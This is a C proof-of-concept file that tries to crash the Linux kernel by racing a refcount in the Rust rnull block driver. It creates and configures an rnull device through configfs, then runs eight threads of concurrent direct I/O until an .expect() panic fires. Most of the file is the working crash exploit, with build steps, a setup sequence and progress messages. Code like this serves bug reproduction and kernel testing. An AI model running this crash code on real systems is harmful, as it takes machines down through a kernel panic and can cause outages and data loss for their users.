/*
 * rnull_crash.c - Trigger .expect() panic in Rust rnull block driver
 *
 * The rnull driver uses .expect() in queue_rq (IRQMode::None path).
 * end_ok() fails if refcount != 2 during a race with tag_to_rq.
 * We hammer concurrent I/O + requeue to trigger this.
 *
 * Requires: CONFIG_BLK_DEV_RUST_NULL=y/m, CONFIG_CONFIGFS_FS=y
 * Build: gcc -static -pthread -o rnull_crash rnull_crash.c
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <errno.h>
#include <linux/fs.h>

#define NUM_THREADS 8
#define NUM_IOS 10000

static char devpath[256];
static volatile int running = 1;

static void write_file(const char *path, const char *val)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) { perror(path); return; }
    write(fd, val, strlen(val));
    close(fd);
}

static void *io_thread(void *arg)
{
    int tid = (int)(long)arg;
    char buf[4096];
    memset(buf, 0x41 + tid, sizeof(buf));

    int fd = open(devpath, O_RDWR | O_DIRECT);
    if (fd < 0) fd = open(devpath, O_RDWR);
    if (fd < 0) { perror(devpath); return NULL; }

    for (int i = 0; i < NUM_IOS && running; i++) {
        /* Mix reads and writes at various offsets */
        off_t off = (i * 4096) % (4096 * 256);
        if (i % 2 == 0)
            pwrite(fd, buf, 4096, off);
        else
            pread(fd, buf, 4096, off);
    }

    close(fd);
    return NULL;
}

int main(void)
{
    printf("=== rnull Crash PoC ===\n");
    printf("pid=%d uid=%d\n\n", getpid(), getuid());

    /* Step 1: Create rnull device via configfs */
    printf("[1] Creating rnull device via configfs...\n");
    if (mkdir("/sys/kernel/config/rnull/crashdev", 0755) && errno != EEXIST) {
        /* Try mounting configfs first */
        system("mount -t configfs none /sys/kernel/config 2>/dev/null");
        if (mkdir("/sys/kernel/config/rnull/crashdev", 0755) && errno != EEXIST) {
            perror("mkdir configfs");
            printf("Note: needs CONFIG_BLK_DEV_RUST_NULL=y and rnull_mod loaded\n");
            return 1;
        }
    }

    /* Step 2: Configure device */
    printf("[2] Configuring: blocksize=4096, size=4096MiB, irqmode=0 (None)\n");
    write_file("/sys/kernel/config/rnull/crashdev/blocksize", "4096");
    write_file("/sys/kernel/config/rnull/crashdev/size", "4096");
    write_file("/sys/kernel/config/rnull/crashdev/irqmode", "0");

    /* Step 3: Power on → creates /dev/rnullbX */
    printf("[3] Powering on device...\n");
    write_file("/sys/kernel/config/rnull/crashdev/power", "1");

    /* Find the device */
    devpath[0] = 0;
    for (int i = 0; i < 16; i++) {
        char p[256];
        snprintf(p, sizeof(p), "/dev/rnullb%d", i);
        if (access(p, F_OK) == 0) { strcpy(devpath, p); break; }
    }
    if (!devpath[0]) {
        /* Try ls */
        FILE *f = popen("ls /dev/rnullb* 2>/dev/null | head -1", "r");
        if (f) { fgets(devpath, sizeof(devpath), f); pclose(f); }
        devpath[strcspn(devpath, "\n")] = 0;
    }
    printf("    Device: %s\n", devpath);

    if (access(devpath, F_OK) != 0) {
        printf("ERROR: No rnull device found\n");
        return 1;
    }

    /* Step 4: Hammer with concurrent I/O to race end_ok refcount */
    printf("[4] Spawning %d threads doing %d I/Os each...\n", NUM_THREADS, NUM_IOS);
    printf("    If .expect() fires: kernel panic from refcount race\n\n");

    pthread_t threads[NUM_THREADS];
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_create(&threads[i], NULL, io_thread, (void *)(long)i);
    for (int i = 0; i < NUM_THREADS; i++)
        pthread_join(threads[i], NULL);

    printf("[*] I/O completed without crash.\n");
    printf("    The .expect() race is timing-dependent.\n");
    printf("    On real hardware with multiple CPUs, repeat under load.\n");

    /* Cleanup */
    write_file("/sys/kernel/config/rnull/crashdev/power", "0");
    rmdir("/sys/kernel/config/rnull/crashdev");

    return 0;
}
